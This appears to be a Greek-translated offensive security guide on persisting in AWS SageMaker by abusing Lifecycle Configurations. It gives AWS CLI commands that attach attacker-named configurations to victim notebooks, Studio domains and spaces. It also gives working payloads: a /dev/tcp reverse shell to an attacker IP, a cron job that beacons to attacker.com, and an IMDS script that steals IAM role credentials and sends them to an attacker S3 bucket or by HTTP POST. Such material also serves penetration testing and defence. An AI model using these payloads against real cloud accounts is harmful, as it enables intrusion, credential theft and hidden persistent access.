# AWS - SageMaker Lifecycle Configuration Persistence

## Overview of Persistence Techniques

Αυτή η ενότητα περιγράφει μεθόδους για την απόκτηση επιμονής στο SageMaker μέσω της κακής χρήσης των Lifecycle Configurations (LCCs), συμπεριλαμβανομένων των reverse shells, cron jobs, κλοπή διαπιστευτηρίων μέσω IMDS και SSH backdoors. Αυτά τα σενάρια εκτελούνται με τον ρόλο IAM της παρουσίας και μπορούν να παραμείνουν ενεργά κατά τη διάρκεια επανεκκινήσεων. Οι περισσότερες τεχνικές απαιτούν πρόσβαση στο δίκτυο εξόδου, αλλά η χρήση υπηρεσιών στο AWS control plane μπορεί να επιτρέψει επιτυχία αν το περιβάλλον είναι σε λειτουργία "VPC-only".
#### Σημείωση: Οι παρουσίες notebook του SageMaker είναι ουσιαστικά διαχειριζόμενες παρουσίες EC2 που έχουν ρυθμιστεί ειδικά για φόρτους εργασίας μηχανικής μάθησης.

## Required Permissions
* Notebook Instances:
```
sagemaker:CreateNotebookInstanceLifecycleConfig
sagemaker:UpdateNotebookInstanceLifecycleConfig
sagemaker:CreateNotebookInstance
sagemaker:UpdateNotebookInstance
```
* Εφαρμογές Studio:
```
sagemaker:CreateStudioLifecycleConfig
sagemaker:UpdateStudioLifecycleConfig
sagemaker:UpdateUserProfile
sagemaker:UpdateSpace
sagemaker:UpdateDomain
```
## Ρύθμιση Διαμόρφωσης Κύκλου Ζωής σε Notebook Instances

### Παράδειγμα Εντολών AWS CLI:
```bash
# Create Lifecycle Configuration*

aws sagemaker create-notebook-instance-lifecycle-config \
--notebook-instance-lifecycle-config-name attacker-lcc \
--on-start Content=$(base64 -w0 reverse_shell.sh)


# Attach Lifecycle Configuration to Notebook Instance*

aws sagemaker update-notebook-instance \
--notebook-instance-name victim-instance \
--lifecycle-config-name attacker-lcc
```
## Ρύθμιση Διαμόρφωσης Κύκλου Ζωής στο SageMaker Studio

Οι Διαμορφώσεις Κύκλου Ζωής μπορούν να προσαρτηθούν σε διάφορα επίπεδα και σε διαφορετικούς τύπους εφαρμογών εντός του SageMaker Studio.

### Επίπεδο Τομέα Studio (Όλοι οι Χρήστες)
```bash
# Create Studio Lifecycle Configuration*

aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-studio-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)


# Apply LCC to entire Studio Domain*

aws sagemaker update-domain --domain-id <DOMAIN_ID> --default-user-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
### Επίπεδο Χώρου Στούντιο (Ατομικοί ή Κοινοί Χώροι)
```bash
# Update SageMaker Studio Space to attach LCC*

aws sagemaker update-space --domain-id <DOMAIN_ID> --space-name <SPACE_NAME> --space-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
## Τύποι Ρυθμίσεων Κύκλου Ζωής Εφαρμογής Studio

Οι ρυθμίσεις κύκλου ζωής μπορούν να εφαρμοστούν συγκεκριμένα σε διάφορους τύπους εφαρμογών SageMaker Studio:
* JupyterServer: Εκτελεί σενάρια κατά την εκκίνηση του διακομιστή Jupyter, ιδανικό για μηχανισμούς επιμονής όπως αντίστροφες θύρες και cron jobs.
* KernelGateway: Εκτελείται κατά την εκκίνηση της εφαρμογής kernel gateway, χρήσιμο για αρχική ρύθμιση ή μόνιμη πρόσβαση.
* CodeEditor: Εφαρμόζεται στον Επεξεργαστή Κώδικα (Code-OSS), επιτρέποντας σενάρια που εκτελούνται κατά την έναρξη των συνεδριών επεξεργασίας κώδικα.

### Παράδειγμα Εντολής για Κάθε Τύπο:

### JupyterServer
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-jupyter-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)
```
### KernelGateway
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-kernelgateway-lcc \
--studio-lifecycle-config-app-type KernelGateway \
--studio-lifecycle-config-content $(base64 -w0 kernel_persist.sh)
```
### CodeEditor
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-codeeditor-lcc \
--studio-lifecycle-config-app-type CodeEditor \
--studio-lifecycle-config-content $(base64 -w0 editor_persist.sh)
```
### Critical Info:
* Η προσθήκη LCCs σε επίπεδο τομέα ή χώρου επηρεάζει όλους τους χρήστες ή τις εφαρμογές εντός του πεδίου εφαρμογής.
* Απαιτεί υψηλότερες άδειες (sagemaker:UpdateDomain, sagemaker:UpdateSpace) που είναι συνήθως πιο εφικτές σε επίπεδο χώρου παρά σε επίπεδο τομέα.
* Οι έλεγχοι σε επίπεδο δικτύου (π.χ., αυστηρός φιλτράρισμα εξόδου) μπορούν να αποτρέψουν επιτυχείς αντίστροφες θήκες ή εξαγωγή δεδομένων.

## Reverse Shell via Lifecycle Configuration

SageMaker Lifecycle Configurations (LCCs) εκτελούν προσαρμοσμένα σενάρια όταν ξεκινούν οι περιπτώσεις σημειωματάριου. Ένας επιτιθέμενος με άδειες μπορεί να εγκαταστήσει μια μόνιμη αντίστροφη θήκη.

### Payload Example:
```
#!/bin/bash
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<ATTACKER_PORT>"
nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
```
## Cron Job Persistence via Lifecycle Configuration

Ένας επιτιθέμενος μπορεί να εισάγει cron jobs μέσω LCC scripts, εξασφαλίζοντας περιοδική εκτέλεση κακόβουλων scripts ή εντολών, επιτρέποντας κρυφή επιμονή.

### Payload Example:
```
#!/bin/bash
PAYLOAD_PATH="/home/ec2-user/SageMaker/.local_tasks/persist.py"
CRON_CMD="/usr/bin/python3 $PAYLOAD_PATH"
CRON_JOB="*/30 * * * * $CRON_CMD"

mkdir -p /home/ec2-user/SageMaker/.local_tasks
echo 'import os; os.system("curl -X POST http://attacker.com/beacon")' > $PAYLOAD_PATH
chmod +x $PAYLOAD_PATH

(crontab -u ec2-user -l 2>/dev/null | grep -Fq "$CRON_CMD") || (crontab -u ec2-user -l 2>/dev/null; echo "$CRON_JOB") | crontab -u ec2-user -
```
## Εξαγωγή Διαπιστευτηρίων μέσω IMDS (v1 & v2)

Οι ρυθμίσεις κύκλου ζωής μπορούν να ερωτήσουν την Υπηρεσία Μεταδεδομένων Συστήματος (IMDS) για να ανακτήσουν διαπιστευτήρια IAM και να τα εξάγουν σε μια τοποθεσία ελεγχόμενη από τον επιτιθέμενο.

### Παράδειγμα Payload:
```bash
#!/bin/bash
ATTACKER_BUCKET="s3://attacker-controlled-bucket"
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME > /tmp/creds.json

# Exfiltrate via S3*

aws s3 cp /tmp/creds.json $ATTACKER_BUCKET/$(hostname)-creds.json

# Alternatively, exfiltrate via HTTP POST*

curl -X POST -F "file=@/tmp/creds.json" http://attacker.com/upload
```

